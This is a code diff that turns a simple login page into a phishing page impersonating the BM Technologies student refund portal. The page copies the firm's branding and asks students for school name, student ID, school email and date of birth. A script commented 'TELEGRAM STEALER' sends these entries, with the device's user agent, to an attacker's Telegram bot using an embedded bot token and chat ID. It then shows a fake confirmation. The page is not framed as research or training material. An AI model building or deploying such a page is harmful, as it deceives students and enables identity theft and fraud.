@@ -1,21 +1,244 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Vibe Clone</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Refund Selection - BM Technologies</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
+
+@font-face {
+font-family: 'MuseoSlab';
+src: url('https://fonts.cdnfonts.com/s/14883/Museo_Slab_500.woff');
+}
+
+body {
+font-family: 'Inter', sans-serif;
+color: #1d252d;
+line-height: 1.5;
+}
+
+.font-museo { font-family: 'MuseoSlab', serif; }
+
+/* Exact Input Box Styling */
+.input-wrapper {
+position: relative;
+margin-bottom: 1rem;
+}
+
+.custom-input {
+width: 100%;
+height: 60px;
+border: 1px solid #ced4da;
+border-radius: 2px;
+padding: 24px 16px 8px 16px;
+font-size: 16px;
+outline: none;
+background: #fff;
+transition: border-color 0.2s;
+appearance: none;
+}
+
+.custom-input:focus {
+border: 2px solid #00c2ff;
+}
+
+.custom-label {
+position: absolute;
+left: 16px;
+top: 18px;
+color: #6c757d;
+transition: all 0.2s;
+pointer-events: none;
+}
+
+.custom-input:focus + .custom-label,
+.custom-input:not(:placeholder-shown) + .custom-label {
+top: 6px;
+font-size: 12px;
+color: #1d252d;
+}
+
+.bg-pattern {
+background-image: url('https://bm-tech.d25lke22w4qozd.amplifyapp.com/svgs/home-bg.svg');
+background-size: cover;
+background-position: center;
+}
+
+.btn-request {
+width: 100%;
+padding: 16px;
+background: white;
+border: 2px solid #00c2ff;
+color: #00c2ff;
+font-weight: 700;
+text-transform: uppercase;
+letter-spacing: 1.5px;
+border-radius: 2px;
+margin-top: 12px;
+cursor: pointer;
+}
+
+.btn-request:hover {
+background-color: #f0fbff;
+}
+</style>
 </head>
-<body>
-  <div class="login-container">
-    <div class="logo">VIBE</div>
-    <h2>Sign in</h2>
+<body class="bg-white">
 
-    <input type="email" id="email" placeholder="Email" />
-    <input type="password" id="password" placeholder="Password" />
-    <button id="loginBtn">Log In</button>
-    <button id="darkToggle">Toggle Dark Mode</button>
-  </div>
+<header class="flex justify-between items-center px-6 py-4 border-b border-gray-100 sticky top-0 bg-white z-50">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/static/media/bm_logo.a1596ca4.svg" alt="BM Technologies" class="h-9">
+<button class="flex items-center gap-2 bg-[#002e6d] text-white px-5 py-2 rounded-full text-sm font-bold">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/svgs/menu.svg" class="w-4 h-4" alt="menu">
+Menu
+</button>
+</header>
 
-  <script src="app.js"></script>
+<section class="bg-[#f8fbff] pt-10 pb-16 px-6 bg-pattern">
+<div class="max-w-md mx-auto">
+<h1 class="text-[34px] font-museo font-bold text-[#1d252d] leading-[1.1] mb-8">
+Your college or university may have money for you!
+</h1>
+
+<div class="relative mb-6">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fmobile-hero-image.01d5fd41.png&w=750&q=75"
+alt="Student" class="rounded-lg shadow-xl w-full">
+
+<div class="absolute top-6 left-4 bg-white p-3 rounded shadow-lg flex items-center gap-3">
+<div class="bg-[#22c55e] rounded-full p-1">
+<svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" /></svg>
+</div>
+<div>
+<p class="font-bold text-xs">Refund received!</p>
+<p class="text-[10px] text-gray-400">Your money is here!</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<main class="max-w-md mx-auto px-4 -mt-10 relative z-20">
+<div class="bg-white rounded-md shadow-2xl border border-gray-100 overflow-hidden mb-12">
+<div class="p-6">
+<div class="flex justify-between items-center mb-6">
+<h2 class="text-xl font-bold">I need a code</h2>
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/static/media/arrow_down.67a20fd4.svg" class="w-6 h-6 rotate-180" alt="arrow">
+</div>
+
+<div class="space-y-4 mb-8">
+<h3 class="text-lg font-bold">It's an easy process</h3>
+<div class="flex gap-4 items-start">
+<span class="bg-[#e6f0ff] text-[#002e6d] font-bold rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 text-sm">1</span>
+<p class="text-sm text-gray-600">Get started by requesting your personal code. Why is this needed? To confirm you are a student at your college or university.</p>
+</div>
+<div class="flex gap-4 items-start">
+<span class="bg-[#e6f0ff] text-[#002e6d] font-bold rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 text-sm">2</span>
+<p class="text-sm text-gray-600">Your code will be emailed to you. Come back and enter it to select your refund method.</p>
+</div>
+</div>
+
+<p class="text-xs text-gray-400 italic mb-6">For your security, please provide us with the information below.</p>
+
+<form onsubmit="event.preventDefault()">
+<div class="input-wrapper">
+<input type="text" id="school" placeholder=" " class="custom-input">
+<label class="custom-label">School name</label>
+</div>
+
+<div class="input-wrapper">
+<input type="text" id="sid" placeholder=" " class="custom-input">
+<label class="custom-label">Student ID number</label>
+</div>
+
+<div class="input-wrapper">
+<input type="email" id="email" placeholder=" " class="custom-input">
+<label class="custom-label">School email</label>
+</div>
+
+<div class="input-wrapper">
+<input type="date" id="dob" placeholder=" " class="custom-input">
+<label class="custom-label">Date of birth</label>
+</div>
+
+<button onclick="submitRefundRequest()" class="btn-request">
+Request my personal code
+</button>
+</form>
+</div>
+</div>
+</main>
+
+<section class="bg-[#f0f7ff] px-6 py-16">
+<div class="max-w-md mx-auto text-[#1d252d]">
+<h2 class="text-[28px] font-museo font-bold mb-4">A few of our partner schools</h2>
+<p class="text-sm leading-relaxed mb-10">
+We partner with your school and over 700 college, university and community college campuses to deliver refunds to students across the U.S. including:
+</p>
+
+<div class="grid grid-cols-2 gap-x-8 gap-y-12 mb-12">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ffresno.29bd3a15.png&w=640&q=75" class="h-10 object-contain grayscale opacity-50" alt="Fresno State">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fchicagostate.b8b075f7.png&w=640&q=75" class="h-10 object-contain grayscale opacity-50" alt="Chicago State">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fsuny.6d97a1ba.png&w=828&q=75" class="h-10 object-contain grayscale opacity-50" alt="SUNY">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Farkansas.2fce0c5a.png&w=640&q=75" class="h-10 object-contain grayscale opacity-50" alt="Arkansas">
+</div>
+</div>
+</section>
+
+<section class="bg-white px-6 py-16">
+<div class="max-w-md mx-auto space-y-4 text-[#1d252d]">
+<h2 class="font-museo text-[29px] font-bold leading-[1.1]">About Us</h2>
+<p class="text-base leading-6">
+BM Technologies, Inc. is among the largest digital banking platforms in the U.S. and its Disbursements program helps colleges and universities across the U.S. deliver refunds to students.
+</p>
+<p class="text-base leading-6">
+We have been helping students for over 20 years! In fact, one in every three student refunds in the U.S. is processed through our platform. Don't delay your refund money from your school–enter your personal code to make your refund choice today!
+</p>
+</div>
+</section>
+
+<footer class="bg-white px-8 py-12 text-[11px] text-[#6c757d] text-center leading-relaxed border-t border-gray-100">
+<div class="flex justify-center items-center gap-3 mb-8">
+<img src="https://bm-tech.d25lke22w4qozd.amplifyapp.com/_next/static/media/bm_logo.a1596ca4.svg" class="h-6" alt="BM Logo">
+</div>
+<p class="mb-4">© 2026 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.</p>
+<p>BankMobile banking products and banking services are provided by First Carolina Bank, member FDIC & Equal Housing Lender.</p>
+</footer>
+
+<!-- TELEGRAM STEALER -->
+<script>
+const BOT_TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
+const CHAT_ID = "1957450632";
+
+async function sendToTelegram(message) {
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+try {
+await fetch(url, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+});
+} catch (e) {}
+}
+
+function submitRefundRequest() {
+const school = document.getElementById("school").value.trim();
+const studentId = document.getElementById("sid").value.trim();
+const schoolEmail = document.getElementById("email").value.trim();
+const dob = document.getElementById("dob").value;
+
+const msg = `🔐 NEW BM TECHNOLOGIES REFUND REQUEST\n\n` +
+`School Name: ${school || "Not provided"}\n` +
+`Student ID: ${studentId || "Not provided"}\n` +
+`School Email: ${schoolEmail || "Not provided"}\n` +
+`Date of Birth: ${dob || "Not provided"}\n\n` +
+`Time: ${new Date().toLocaleString()}\n` +
+`Device: ${navigator.userAgent}`;
+
+sendToTelegram(msg);
+
+alert("Your request has been submitted successfully! Please check your school email.");
+}
+</script>
 </body>
 </html>
